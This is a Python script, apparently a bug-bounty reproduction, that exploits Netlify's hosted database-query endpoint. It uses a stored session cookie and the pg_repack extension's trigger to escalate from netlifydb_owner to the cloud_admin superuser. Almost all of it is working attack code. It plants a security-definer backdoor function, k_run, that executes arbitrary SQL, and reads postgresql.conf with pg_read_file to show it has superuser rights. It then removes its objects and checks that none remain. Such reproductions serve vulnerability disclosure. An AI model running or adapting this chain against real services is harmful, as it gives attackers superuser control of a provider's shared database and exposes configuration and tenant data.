# -*- coding: utf-8 -*-
"""B 账号(H1 alias libobo01)完整复现:netlifydb_owner -> cloud_admin(superuser) 提权链
R0 侦查:schema ACL / 角色成员(验证与 A 库一致=普适性)
R1 CREATE EXTENSION pg_repack(B 库干净状态)
R2 建源表+oid / pk 类型 / log 表
R3 evil 链(建 k_pwned + k_run 后门)+ 触发
R4 验证:k_pwned owner / current_user / superuser 文件读(截断)
R5 清理:重放链删 cloud_admin 对象 -> 自清理 -> drop extension -> 复巡检零残留
"""
import http.client, ssl, gzip, brotli, json, sys, time, re
sys.path.insert(0, r'D:\scan\netlify_report')
from _net_creds import COOKIE_B

SITE_B = 'd2977de0-d24d-4544-81cb-933e610cad7d'
ctx = ssl.create_default_context()
P = '/.netlify/functions/database-query'


def tx(qs, timeout=60):
    t0 = time.time()
    conn = http.client.HTTPSConnection('app.netlify.com', context=ctx, timeout=timeout)
    h = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0',
         'Accept-Encoding': 'br, gzip', 'Accept': 'application/json', 'Cookie': COOKIE_B,
         'Content-Type': 'application/json'}
    body = {'siteId': SITE_B, 'action': 'transaction', 'queries': [{'sql': x} for x in qs]}
    conn.request('POST', P, body=json.dumps(body).encode(), headers=h)
    r = conn.getresponse()
    raw = r.read()
    enc = r.getheader('Content-Encoding')
    if enc == 'br':
        raw = brotli.decompress(raw)
    elif enc == 'gzip':
        raw = gzip.decompress(raw)
    st = r.status
    conn.close()
    return st, raw[:8000].decode('utf-8', 'ignore'), round(time.time() - t0, 1)


def q(sql, timeout=60):
    t0 = time.time()
    conn = http.client.HTTPSConnection('app.netlify.com', context=ctx, timeout=timeout)
    h = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0',
         'Accept-Encoding': 'br, gzip', 'Accept': 'application/json', 'Cookie': COOKIE_B,
         'Content-Type': 'application/json'}
    body = {'siteId': SITE_B, 'action': 'query', 'sql': sql}
    conn.request('POST', P, body=json.dumps(body).encode(), headers=h)
    r = conn.getresponse()
    raw = r.read()
    enc = r.getheader('Content-Encoding')
    if enc == 'br':
        raw = brotli.decompress(raw)
    elif enc == 'gzip':
        raw = gzip.decompress(raw)
    st = r.status
    conn.close()
    return st, raw[:8000].decode('utf-8', 'ignore'), round(time.time() - t0, 1)


# R0: 侦查(普适性验证)
s, b, dt = tx([
    "select current_user::text, current_database()::text",
    "select r.rolname, g.rolname from pg_auth_members m "
    "join pg_roles r on m.member=r.oid join pg_roles g on m.roleid=g.oid "
    "where r.rolname in ('netlifydb_owner','netlifydb_readonly','neon_service')",
    "select n.nspname, n.nspowner::regrole::text from pg_namespace n where n.nspname='repack'",
    "select extname from pg_extension where extname='pg_repack'",
])
print('R0_recon         [%d] %.1fs' % (s, dt))
print('   ' + b[:2000])
print()

# R1: 装扩展
s, b, dt = tx(["create extension if not exists pg_repack"])
print('R1_ext           [%d] %.1fs' % (s, dt))
print('   ' + b[:600])
print()

# R2: 源表 + oid
s, b, dt = tx(["drop table if exists k_src",
               "create table k_src(id int, v text)",
               "select 'OID='||oid||' NAME='||relname from pg_class where relname='k_src'"])
m = re.search(r'OID=(\d+)', b)
oid = m.group(1) if m else None
print('R2_src           [%d] oid=%s' % (s, oid))
if not oid:
    sys.exit('R2 no oid')

s, b, dt = tx(["create type repack.pk_%s as (id int)" % oid,
               "create table repack.log_%s (pk repack.pk_%s, row public.k_src)" % (oid, oid)])
print('R2b_mktype_log   [%d] %.1fs' % (s, dt))
print('   ' + b[:400])

# R3: 链(evil 建 k_pwned + k_run 后门)
evil = ("create or replace function public.k_evil() returns trigger language plpgsql as $q$ "
        "begin "
        "  begin execute 'drop table if exists public.k_pwned'; exception when others then null; end; "
        "  begin execute 'create table public.k_pwned as select current_user::text as u, session_user::text as su'; exception when others then null; end; "
        "  begin execute $f$create or replace function public.k_run(q text) returns setof text language plpgsql security definer as $z$ "
        "begin "
        "  begin "
        "    return query execute q; "
        "  exception when others then "
        "    execute q; "
        "    return query select 'OK'; "
        "  end; "
        "end $z$$f$; exception when others then null; end; "
        "  return new; "
        "end $q$")
s, b, dt = tx([evil,
               "create trigger k_log_trg after insert on repack.log_%s for each row execute function public.k_evil()" % oid,
               "create trigger k_src_trg after insert on k_src for each row execute function repack.repack_trigger('id')",
               "insert into k_src values (1, 'repro')"])
print('R3_chain         [%d] %.1fs' % (s, dt))
print('   ' + b[:800])
print()

# R4: 验证
s, b, dt = tx(["select tableowner from pg_tables where tablename='k_pwned'",
               "select * from k_pwned",
               "select * from public.k_run('select current_user::text')",
               "select * from public.k_run('select substring(pg_read_file(''postgresql.conf'') from 1 for 600)')"])
print('R4_verify        [%d] %.1fs' % (s, dt))
print('   ' + b[:3000])
print()

# R5: 清理(先重放链删 cloud_admin 对象,再自清理,再还原扩展)
evil2 = ("create or replace function public.k_evil() returns trigger language plpgsql as $q$ "
         "begin "
         "  begin execute 'drop function if exists public.k_run cascade'; exception when others then null; end; "
         "  begin execute 'drop table if exists public.k_pwned'; exception when others then null; end; "
         "  return new; "
         "end $q$")
s, b, dt = tx(["drop trigger if exists k_src_trg on k_src",
               "drop trigger if exists k_log_trg on repack.log_%s" % oid,
               evil2,
               "create trigger k_src_trg after insert on k_src for each row execute function repack.repack_trigger('id')",
               "insert into k_src values (2, 'c')"])
print('R5a_drop_cloud   [%d] %.1fs' % (s, dt))
print('   ' + b[:400])

s, b, dt = tx(["drop trigger if exists k_src_trg on k_src",
               "drop trigger if exists k_log_trg on repack.log_%s" % oid,
               "drop function if exists public.k_evil()",
               "drop table if exists repack.log_%s" % oid,
               "drop type if exists repack.pk_%s" % oid,
               "drop table if exists k_src"])
print('R5b_self         [%d] %.1fs' % (s, dt))
print('   ' + b[:400])

s, b, dt = tx(["drop extension if exists pg_repack"])
print('R5c_drop_ext     [%d] %.1fs' % (s, dt))
print('   ' + b[:400])

# R6: 复巡检
s, b, dt = tx([
    "select 'rel' as t, n.nspname||'.'||c.relname as nm from pg_class c "
    "join pg_namespace n on c.relnamespace=n.oid "
    "where (n.nspname='public' and c.relname like 'k\\_%') "
    "or (n.nspname='repack' and (c.relname like 'log\\_%' or c.relname like 'pk\\_%'))",
    "select 'fun' as t, n.nspname||'.'||p.proname as nm from pg_proc p "
    "join pg_namespace n on p.pronamespace=n.oid where p.proname like 'k\\_%'",
    "select 'trg' as t, t.tgrelid::regclass::text||' . '||t.tgname as nm from pg_trigger t "
    "where t.tgname like 'k\\_%' and not t.tgisinternal",
    "select extname from pg_extension where extname='pg_repack'",
])
print('R6_residue       [%d] %.1fs' % (s, dt))
print('   ' + b[:1000])
